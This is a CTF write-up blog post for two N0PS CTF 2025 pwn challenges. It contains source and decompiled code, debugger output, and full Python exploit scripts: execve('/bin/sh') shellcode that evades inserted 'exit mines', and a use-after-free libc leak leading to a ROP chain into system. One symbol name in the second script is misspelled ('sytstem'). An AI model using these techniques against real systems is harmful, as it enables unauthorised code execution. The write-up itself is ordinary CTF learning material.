@@ -1,0 +1,726 @@
+---
+title: '[WRITE UP] - N0PS CTF 2025'
+description: 'Yet another CTF wrtite up'
+image: '../../img/cover_photo_wup_imresizer.png'
+date: '2025-06-03'
+tags: ['2025', 'PWN', 'WriteUp']
+authors: ['kdot']
+draft: false
+pinned: false
+---
+
+import Challenge from '@/components/mdx/Challenge.astro'
+
+## pwnfield
+
+### Challenge Information
+
+<Challenge
+    authors={["Xen0s"]}
+    points={473}
+    solves={27}
+    category="pwn"
+    description="We discovered that PwnTopia use their secret mine to collect shellcodium, a very rare and powerful resource! We need it too, to be able to defend N0PStopia. However, PwnTopia has put some mines in the way to the shellcodium, but we are lucky PwnTopia left their most powerful tool, a shell , sh on their way out! Can this be a secret message? Can you manage to avoid the mines and use their tool against them?"
+    flag="N0PS{0n3_h45_70_jump_0n_7h3_204d_70_pwnt0p1a}"
+>
+</Challenge>
+
+### Source code analysis
+
+<details id="src">
+<summary>Souce code</summary>
+<p>
+
+```c title="pwnfield.c"
+#include <stdio.h>
+#include <stdlib.h>
+#include <stdint.h>
+#include <string.h>
+#include <sys/mman.h>
+#include <unistd.h>
+
+#define MAX_INSTRUCTIONS 32
+#define USER_INSTR_SIZE 5
+#define MINE_SIZE 12
+#define LINE_SIZE (USER_INSTR_SIZE + MINE_SIZE)
+#define TOTAL_SIZE (LINE_SIZE * MAX_INSTRUCTIONS) + 1
+
+const uint8_t exit_mine[] = {
+    0xB8, 0x3C, 0x00, 0x00, 0x00,
+    0xBF, 0x39, 0x05, 0x00, 0x00,
+    0x0F, 0x05
+};
+
+int main() {
+    setbuf(stdin, NULL);
+    setbuf(stdout, NULL);
+
+    void *mem = mmap(NULL, TOTAL_SIZE, PROT_READ | PROT_WRITE | PROT_EXEC,
+                     MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
+    if (mem == MAP_FAILED) {
+        perror("mmap");
+        exit(1);
+    }
+
+    uint8_t *p = mem;
+    printf("Type 'exit' to stop inputting instructions.\n");
+    for (int i = 0; i < MAX_INSTRUCTIONS; i++) {
+        printf("Instruction %d/32 (5 bytes mov): ", i + 1);
+        fflush(stdout);
+
+        uint8_t buf[USER_INSTR_SIZE];
+        ssize_t n = read(0, buf, USER_INSTR_SIZE);
+        if (n != USER_INSTR_SIZE) {
+            puts("Bad input.");
+            exit(1);
+        }
+
+        if (strncmp((char *)buf, "exit", 4) == 0) {
+            puts("Starting execution!");
+            break;
+        }
+
+        // Must be mov — opcode B8..BF
+        if (buf[0] < 0xB8 || buf[0] > 0xBF) {
+            puts("Only mov r32, imm32 allowed.");
+            exit(1);
+        }
+
+        memcpy(p, buf, USER_INSTR_SIZE);
+        p += USER_INSTR_SIZE;
+
+        memcpy(p, exit_mine, MINE_SIZE);
+        p += MINE_SIZE;
+    }
+
+
+    printf("Start execution from which instruction? ");
+    fflush(stdout);
+
+    char input[32];
+    read(0, input, sizeof(input) - 1);
+    input[31] = '\0';
+
+    int32_t index = atoi(input);
+
+    // Check if index is within bounds
+    if (index < 0) {
+        puts("Invalid instruction index.");
+        exit(1);
+    }
+
+    // Calculate starting address with bounds checking
+    void *start = mem + (((int64_t)index * LINE_SIZE) % TOTAL_SIZE);
+
+    puts("Executing...");
+    ((void(*)())start)();
+
+    return 0;
+}
+```
+</p>
+</details>
+
+This will be a shellcode challenge, but with some restrictions. One of those restrictions is that `exit_mine` will be added after each time we enter our shellcode. And we are only allowed to enter 5 bytes at a time (32 times in total). More notably, in the calculation to execute the shellcode based on the index, our shellcode will be ordered to go 1 byte based on this formula
+
+```c
+void *start = mem + (((int64_t)index * LINE_SIZE) % TOTAL_SIZE);
+```
+
+That is, if the address of where we write the shellcode is `0x404400`, then when it executes it will execute at `0x404401`. Therefore, our shellcode is always offset by 1 byte and from there it always executes the commands in `exit_mine`
+
+### Exploit
+
+To solve this problem, we can think of using the jump command to jump to each section in our shellcode. Our idea here is to let the program read one more time, and in this next write we will write the real shellcode, that is, execve to drop the shell. So to calculate the offset you want to jump you can try to enter some random instruction that satisfies the condition, then just subtract the address from it:
+
+```sh title="GDB"
+pwndbg> tel 0x7158ecb42001
+00:0000│ rdx rip 0x7158ecb42001 ◂— pop rsi /* 0x3cb80d755e5e */
+01:0008│         0x7158ecb42009 ◂— add byte ptr [rdi + 0x539], bh /* 0x50f00000539bf00 */
+02:0010│         0x7158ecb42011 ◂— mov edi, 0xd755e5a /* 0x3cb80d755e5abf */
+03:0018│         0x7158ecb42019 ◂— add byte ptr [rax], al /* 0xf00000539bf0000 */
+04:0020│         0x7158ecb42021 ◂— add eax, 0x74ff31bf /* 0x3cb80d74ff31bf05 */
+05:0028│         0x7158ecb42029 ◂— add byte ptr [rax], al /* 0x539bf000000 */
+06:0030│         0x7158ecb42031 ◂— syscall  /* 0xb8e6ff050fbf050f */
+07:0038│         0x7158ecb42039 ◂— cmp al, 0 /* 0x539bf0000003c; '<' */
+pwndbg> x/i 0x7158ecb42011+0x1
+   0x7158ecb42012:      pop    rdx
+pwndbg> x/3i 0x7158ecb42001
+=> 0x7158ecb42001:      pop    rsi
+   0x7158ecb42002:      pop    rsi
+   0x7158ecb42003:      jne    0x7158ecb42012
+pwndbg> p/x 0x7158ecb42012-0x7158ecb42003
+$2 = 0xf
+pwndbg> p/d
+$3 = 15
+```
+
+As we can see our offset will be 0xf which means we will need 15 bytes to hit it, but we can't specify exactly where it will hit the next instruction in the shellcode. So we will just set the offset to `skip` to 13 and add another nop padding of 14 so that when it hits the next instruction in our shellcode, the `nop` will do nothing and thus it will execute the next instruction in the shellcode smoothly.
+One more note is that we need to add a conditional byte at the beginning of the shellcode so that when it `+1` it will execute the correct instruction we want.
+
+<details id="exp">
+<summary>Exploit</summary>
+<p>
+
+```py title="exploit.py" collapse={1-31}
+#!/usr/bin/env python3
+# -*- coding: utf-8 -*-
+from pwnie import *
+from subprocess import check_output
+from time import sleep
+
+context.log_level = 'debug'
+context.terminal = ["wt.exe", "-w", "0", "split-pane", "--size", "0.65", "-d", ".", "wsl.exe", "-d", "Ubuntu-22.04", "--", "bash", "-c"]
+exe = context.binary = ELF('./pwnfield', checksec=False)
+libc = exe.libc
+
+gdbscript = '''
+init-pwndbg
+b *main+594
+c
+'''
+
+def start(argv=[]):
+    if args.REMOTE:
+        return remote(sys.argv[1], sys.argv[2])
+    elif args.DOCKER:
+        p = remote("localhost", 5000)
+        sleep(0.5)
+        pid = int(check_output(["pidof", "-s", "/app/run"]))
+        gdb.attach(int(pid), gdbscript=gdbscript+f"\n set sysroot /proc/{pid}/root\nfile /proc/{pid}/exe", exe=exe.path)
+        pause()
+        return p
+    else:
+        return process([exe.path] + argv)
+
+
+# ==================== EXPLOIT ====================
+p = start()
+
+jmp_not_equal = asm('jne skip; ' + 'nop\n' * 13 + 'skip: nop')[:2]
+jmp_equal = asm('je skip; ' + 'nop\n' * 13 + 'skip: nop')[:2]
+
+instructions = []
+
+sc1 = asm('pop rsi; pop rsi;')
+instructions.append(b'\xbf' + sc1 + jmp_not_equal)
+
+sc2 = asm('pop rdx; pop rsi;')
+instructions.append(b'\xbf' + sc2 + jmp_not_equal)
+
+sc3 = asm('xor edi, edi')
+instructions.append(b'\xbf' + sc3 + jmp_equal)
+
+sc4 = asm('syscall; jmp rsi')
+instructions.append(b'\xbf' + sc4)
+
+
+while len(instructions) < 32:
+    instructions.append(b'\xbf' + p32(0x0))
+
+# print(instructions)
+
+for i, ins in enumerate(instructions):
+    sa(f'Instruction {i+1}/32 (5 bytes mov): '.encode(), ins)
+
+if args.GDB:
+    gdb.attach(p, gdbscript=gdbscript)
+    pause()
+
+sla(b"instruction? ", b"0")
+
+# pause()
+
+sc5 = asm('''
+    xor rax, rax
+    mov rbx, 0x68732f6e69622f
+    push rbx
+    mov rdi, rsp
+    xor rsi, rsi
+    xor rdx, rdx
+    mov al, 0x3b
+    syscall
+''')
+
+sleep(0.2)
+sl(sc5)
+
+interactive()
+# N0PS{0n3_h45_70_jump_0n_7h3_204d_70_pwnt0p1a}
+```
+
+</p>
+</details>
+
+## Under Attack
+
+### Challenge Information
+<Challenge
+    authors={["y3noor"]}
+    points={488}
+    solves={19}
+    category="pwn"
+    description="Ladybug Command System FULLY OPERATIONAL."
+    flag="N0PS{its_N0pSt0pia's_Pleasure_that_L4dy_bug__is_w3aaker!!!__}"
+></Challenge>
+
+### Reverse Engineering
+
+<details id="main">
+<summary>main function</summary>
+<p>
+```c
+__int64 __fastcall main(int a1, char **a2, char **a3)
+{
+  FILE *stdout; // rdi
+  int n3; // ebx
+  unsigned int index; // [rsp+Ch] [rbp-88Ch] BYREF
+  size_t size; // [rsp+10h] [rbp-888h] BYREF
+  __int64 (__fastcall *v8)(); // [rsp+18h] [rbp-880h] BYREF
+  char s1[64]; // [rsp+20h] [rbp-878h] BYREF
+  _BYTE v10[512]; // [rsp+60h] [rbp-838h] BYREF
+  char hex_payload[512]; // [rsp+260h] [rbp-638h] BYREF
+  char s[1080]; // [rsp+460h] [rbp-438h] BYREF
+
+  puts("Noopsy Defenses CRUSHED! Ladybug Command System FULLY OPERATIONAL!");
+  stdout = ::stdout;
+  fflush(::stdout);
+  menu(stdout);
+  printf("\nNoopsy Land is ours! Your command, Overlord?: ");
+  fflush(::stdout);
+  while ( fgets(s, 1024, stdin) )
+  {
+    s[strcspn(s, "\n")] = 0;
+    hex_payload[0] = 0;
+    v10[0] = 0;
+    s1[0] = 0;
+    n3 = __isoc99_sscanf(s, "%63s %511s %511s", s1, v10, hex_payload);
+    if ( n3 > 0 )
+    {
+      if ( !strcmp(s1, "unleash_swarm") )
+      {
+        if ( n3 == 3
+          && (unsigned int)__isoc99_sscanf(v10, "%d", &index) == 1
+          && (unsigned int)__isoc99_sscanf(hex_payload, "%zu", &size) == 1 )
+        {
+          unleash_swarm(index, size);
+        }
+        else
+        {
+          puts("ERROR: Usage: unleash_swarm <idx> <size>");
+        }
+      }
+      else if ( !strcmp(s1, "corrupt_systems") )
+      {
+        if ( n3 == 3 && (unsigned int)__isoc99_sscanf(v10, "%d", &index) == 1 )
+          corrupt_systems(index, hex_payload);
+        else
+          puts("ERROR: Usage: corrupt_systems <idx> <hex_payload>");
+      }
+      else if ( !strcmp(s1, "gather_intel") )
+      {
+        if ( n3 == 2 && (unsigned int)__isoc99_sscanf(v10, "%d", &index) == 1 )
+          gather_intel(index);                  // Leak
+        else
+          puts("ERROR: Usage: gather_intel <idx>");
+      }
+      else if ( !strcmp(s1, "retreat_agent") )
+      {
+        if ( n3 == 2 && (unsigned int)__isoc99_sscanf(v10, "%d", &index) == 1 )
+          retreat_agent(index);                 // Free
+        else
+          puts("ERROR: Usage: retreat_agent <idx>");
+      }
+      else if ( !strcmp(s1, "seize_airwaves") )
+      {
+        if ( n3 == 2 && (unsigned int)__isoc99_sscanf(v10, "%llx", &v8) == 1 )
+          seize_airwaves(v8);
+        else
+          puts("ERROR: Usage: seize_airwaves <hex_addr>");
+      }
+      else if ( !strcmp(s1, "send_echo_pulse") )
+      {
+        if ( n3 == 1 )
+          send_echo_pulse();
+        else
+          puts("ERROR: Usage: send_echo_pulse");
+      }
+      else if ( !strcmp(s1, "steal_noopsy_secrets") )
+      {
+        if ( n3 == 1 )
+          steal_noopsy_secrets();
+        else
+          puts("ERROR: Usage: steal_noopsy_secrets");
+      }
+      else if ( !strcmp(s1, "initiate_city_takeover") )
+      {
+        if ( n3 == 2 && (unsigned int)__isoc99_sscanf(v10, "%llx", &v8) == 1 )
+        {
+          initiate_city_takeover((__int64)v8);
+          puts("[SYSTEM] Post-Takeover: Control flow unexpectedly returned.");
+        }
+        else
+        {
+          puts("ERROR: Usage: initiate_city_takeover <hex_addr>");
+        }
+      }
+      else
+      {
+        if ( !strcmp(s1, "vanish_into_shadows") )
+        {
+          puts("Ladybug Command disengaging. Noopsy Land remains under our shadow.");
+          fflush(::stdout);
+          break;
+        }
+        printf("ERROR: Unknown directive from the Overlord: '%s'.\n", s1);
+      }
+      fflush(::stdout);
+      if ( !strcmp(s1, "vanish_into_shadows") )
+        continue;
+    }
+    printf("\nNoopsy Land is ours! Your command, Overlord?: ");
+    fflush(::stdout);
+  }
+  fflush(::stdout);
+  return 0LL;
+}
+```
+</p>
+</details>
+
+<details id="unleash_swarm">
+<summary>unleash_swarm function</summary>
+<p>
+```c
+int __fastcall unleash_swarm(unsigned int n7, size_t nmemb)
+{
+  void *v2; // rax
+
+  if ( n7 > 7 )
+  {
+    printf("ERROR: Agent index %d out of designated Noopsy sectors (0-%d).\n", n7, 7);
+  }
+  else if ( qword_4040E0[n7] )
+  {
+    printf("ERROR: Agent %d already commands this Noopsy sector.\n", n7);
+  }
+  else if ( nmemb )
+  {
+    v2 = calloc(nmemb, 1uLL);
+    qword_4040E0[n7] = v2;
+    if ( v2 )
+    {
+      qword_4040A0[n7] = nmemb;
+      printf("AGENT_DEPLOYED: %p\n", v2);
+    }
+    else
+    {
+      printf("ERROR: Failed to materialize agent %d (strength %zu). Resources stretched thin?\n", n7, nmemb);
+    }
+  }
+  else
+  {
+    puts("ERROR: Cannot deploy agent of zero strength. Noopsy remnants might resist!");
+  }
+  return fflush(stdout);
+}
+```
+</p>
+</details>
+
+<details id="corrupt_systems">
+<summary>corrupt_systems function</summary>
+<p>
+```c
+int __fastcall corrupt_systems(unsigned int n7, const char *s)
+{
+  const char *s_1; // r15
+  size_t n; // rbp
+  size_t size_1; // r12
+  size_t size; // r14
+  char *ptr_1; // r12
+  __int64 pn7; // rsi
+  const char *inject_msg; // rdi
+  char *ptr; // [rsp+0h] [rbp-48h]
+  void *dest; // [rsp+8h] [rbp-40h]
+
+  if ( n7 > 7 || (dest = (void *)qword_4040E0[n7]) == 0LL )
+  {
+    pn7 = n7;
+    inject_msg = "ERROR: Agent %d is offline. Cannot inject subversive payload.\n";
+    goto LABEL_13;
+  }
+  s_1 = s;
+  n = strlen(s);
+  size_1 = n >> 1;
+  size = (n >> 1) + 1;
+  ptr = (char *)malloc(size);
+  if ( !ptr )
+  {
+    printf("ERROR: Payload buffer corrupted for agent %d.\n", n7);
+    return fflush(stdout);
+  }
+  if ( !n )
+  {
+LABEL_12:
+    memcpy(dest, ptr, n);
+    free(ptr);
+    pn7 = n7;
+    inject_msg = "INJECT_OK: Payload assimilated by agent %d.\n";
+LABEL_13:
+    printf(inject_msg, pn7);
+    return fflush(stdout);
+  }
+  if ( (n & 1) == 0 )
+  {
+    n >>= 1;
+    if ( size >= size_1 )
+    {
+      if ( size_1 )
+      {
+        ptr_1 = ptr;
+        while ( (unsigned int)__isoc99_sscanf(s_1, "%2hhx", ptr_1) == 1 )
+        {
+          s_1 += 2;
+          ++ptr_1;
+          if ( s_1 == &s[2 * n] )
+            goto LABEL_12;
+        }
+        goto LABEL_11;
+      }
+      goto LABEL_12;
+    }
+  }
+LABEL_11:
+  printf("ERROR: Garbled payload data for agent %d.\n", n7);
+  free(ptr);
+  return fflush(stdout);
+}
+```
+</p>
+</details>
+
+<details id="gather_intel">
+<summary>gather_intel function</summary>
+<p>
+```c
+int __fastcall gather_intel(unsigned int n7)
+{
+  unsigned __int64 n16; // rbp
+  unsigned __int64 n16_1; // rbx
+  int pn3; // esi
+
+  if ( n7 <= 7 && qword_4040E0[n7] )
+  {
+    n16 = qword_4040A0[n7];
+    if ( n16 )
+    {
+      if ( n16 > 16 )
+        n16 = 16LL;
+      n16_1 = 0LL;
+      printf("INTEL_DATA: ");
+      do
+      {
+        pn3 = *(unsigned __int8 *)(qword_4040E0[n7] + n16_1++);
+        printf("%02x", pn3);
+      }
+      while ( n16_1 < n16 );
+      putchar(10);
+    }
+    else
+    {
+      printf("INTEL_EMPTY: Agent %d is dormant.\n", n7);
+    }
+  }
+  else
+  {
+    printf("ERROR: Agent %d MIA. Cannot retrieve intel.\n", n7);
+  }
+  return fflush(stdout);
+}
+```
+</p>
+</details>
+
+<details id="retreat_agent">
+<summary>retreat_agent function</summary>
+<p>
+```c
+int __fastcall retreat_agent(unsigned int n7)
+{
+  void *ptr; // rdi
+
+  if ( n7 <= 7 && (ptr = (void *)qword_4040E0[n7]) != 0LL )
+  {
+    free(ptr);                                  // Use-After-Free
+    printf("RECALL_OK: Agent %d has withdrawn.\n", n7);
+  }
+  else
+  {
+    printf("ERROR: Agent %d already extracted or never deployed.\n", n7);
+  }
+  return fflush(stdout);
+}
+```
+</p>
+</details>
+
+<details id="seize_airwaves">
+<summary>seize_airwaves function</summary>
+<p>
+```c
+int __fastcall seize_airwaves(int (*psub_4016B0)())
+{
+  ::psub_4016B0 = psub_4016B0;
+  printf("ANTENNA_OK: Noopsy communication channel %llx is NOW LADYBUG'S VOICE!\n", psub_4016B0);
+  return fflush(stdout);
+}
+```
+</p>
+</details>
+
+<details id="send_echo_pulse">
+<summary>send_echo_pulse function</summary>
+<p>
+```c
+int send_echo_pulse()
+{
+  if ( psub_4016B0 )
+    psub_4016B0();
+  else
+    puts("ERROR: Ladybug Command Relay offline.");
+  return fflush(stdout);
+}
+```
+</p>
+</details>
+
+Looking at the above functions, we will see a bug called `Use-After-Free` in the `retreat_agent` function. Besides, the `seize_airwaves` function allows us to pass in an address and execute it in the `send_echo_pulse` function, which allows us to execute any function arbitrarily if we have the libc base, this is not too difficult because we can create chunks with unlimited size, and putting that chunk into unsortedbin and leaking it with `gather_intel` is not too difficult for us.
+
+### Exploit
+
+The tricky part here is that the program uses a non-Ubuntu libc, which means we have to find a `ld` that matches it for it to run, finding `ld` would be a pain if we were to search for it. Luckily we can build docker and get `ld` from it. After some `GPT-fu` techniques I found out that its image is `debian:bookworm` then we just need to use `docker pull debian:bookworm` and the next thing is to get `ld` and patch it into the binary
+
+Back to the challenge above after getting the libc base, I will use it to pass the address of the `gets` function in and call that `gets` function, with the characteristic of reading infinite data, I can create a ROP chain, then let the program execute it when returning
+
+<details id="exp">
+<summary>Exploit</summary>
+<p>
+
+```py title="exploit.py" collapse={1-41}
+#!/usr/bin/env python3
+# -*- coding: utf-8 -*-
+from pwnie import *
+from subprocess import check_output
+from time import sleep
+
+context.log_level = 'debug'
+context.terminal = ["wt.exe", "-w", "0", "split-pane", "--size", "0.65", "-d", ".", "wsl.exe", "-d", "Ubuntu-22.04", "--", "bash", "-c"]
+exe = context.binary = ELF('./ladybug_app_patched', checksec=False)
+libc = exe.libc
+
+gdbscript = '''
+init-pwndbg
+b *0x40170B
+b *0x401801
+b *0x401897
+b *0x401876
+b *0x401961
+b *0x4019DB
+b *0x4017EB
+b *0x40188F
+b *0x401AD8
+b *0x401A17
+b *0x401A50
+b *0x4013b3
+c
+'''
+
+def start(argv=[]):
+    if args.REMOTE:
+        return remote(sys.argv[1], sys.argv[2])
+    elif args.DOCKER:
+        p = remote("localhost", 5000)
+        sleep(0.5)
+        pid = int(check_output(["pidof", "-s", "/app/run"]))
+        gdb.attach(int(pid), gdbscript=gdbscript+f"\n set sysroot /proc/{pid}/root\nfile /proc/{pid}/exe", exe=exe.path)
+        pause()
+        return p
+    else:
+        return process([exe.path] + argv, aslr=False)
+
+def unleash_swarm(index, size):
+    sla(b'Overlord?: ', f'unleash_swarm {index} {size}'.encode())
+
+def corrupt_systems(index, hex_data):
+    payload = b'corrupt_systems ' + str(index).encode() + b' ' + hex_data
+    sla(b'Overlord?: ', payload)
+
+def gather_intel(index):
+    sla(b'Overlord?: ', f'gather_intel {index}'.encode())
+
+def retreat_agent(index):
+    sla(b'Overlord?: ', f'retreat_agent {index}'.encode())
+
+def reversed_bytes(data: bytes) -> int:
+    if all(32 <= b <= 126 for b in data):
+        real_bytes = bytes.fromhex(data.decode())
+    else:
+        real_bytes = data
+
+    reversed_bytes = real_bytes[::-1]
+    return int.from_bytes(reversed_bytes, byteorder='little')
+
+# ==================== EXPLOIT ====================
+p = start()
+
+unleash_swarm(0,  1056)
+unleash_swarm(1, 1)
+
+ru(b'AGENT_DEPLOYED: ')
+heap = hexleak(rl()[:-1]) - 0x16c0
+success('heap base @ %#x', heap)
+
+retreat_agent(0)
+gather_intel(0)
+
+ru(b'INTEL_DATA: ')
+data = rnb(12)
+
+libc.address = reversed_bytes(data) - 0x1d2cc0
+success('libc base @ %#x', libc.address)
+
+rop = ROP(libc)
+pop_rdi = rop.find_gadget(["pop rdi", "ret"])[0]
+ret = pop_rdi + 1
+
+payload = flat(
+    0,
+    ret,
+    pop_rdi, next(libc.search(b'/bin/sh\0')),
+    libc.sym.sytstem
+)
+
+sla(b'Overlord?: ', f'seize_airwaves {hex(libc.sym.gets)}'.encode())
+
+if args.GDB:
+    gdb.attach(p, gdbscript=gdbscript)
+    pause()
+
+sla(b'Overlord?: ', b'send_echo_pulse')
+
+sl(payload*100)
+
+sla(b'Overlord?: ', b'vanish_into_shadows')
+
+sl(b'cat f*')
+
+interactive()
+# N0PS{its_N0pSt0pia's_Pleasure_that_L4dy_bug__is_w3aaker!!!__}
+```
+</p>
+</details>
+
+## What I learned
+
+After this CTF I had the opportunity to work on more constrained shellcode challenges, practicing my ability to write shellcodes depending on the program's conditions. Besides that, flexibly used functions in libc to build ROP chains and drop a shell.
